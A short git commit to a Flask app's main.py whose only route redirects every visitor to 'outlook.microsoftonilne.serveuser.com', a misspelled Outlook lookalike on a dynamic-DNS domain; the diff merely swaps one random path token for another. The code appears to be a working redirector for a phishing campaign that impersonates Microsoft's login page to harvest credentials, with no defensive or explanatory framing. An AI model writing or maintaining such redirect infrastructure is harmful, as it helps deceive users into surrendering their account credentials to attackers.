2fdd3e02b99b9a6e8f5df2baa3985a14061f14bc
senyp-test <135482766+senyp-test@users.noreply.github.com>
2023-11-27 01:14:47 +0100

    changes

--- main.py
+++ main.py
@@ -4,7 +4,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def home():
-    return redirect("https://outlook.microsoftonilne.serveuser.com/MHEKBfkZ")
+    return redirect("https://outlook.microsoftonilne.serveuser.com/cIgAxmdV")
 
 if __name__ == '__main__':
     app.run(debug=True)
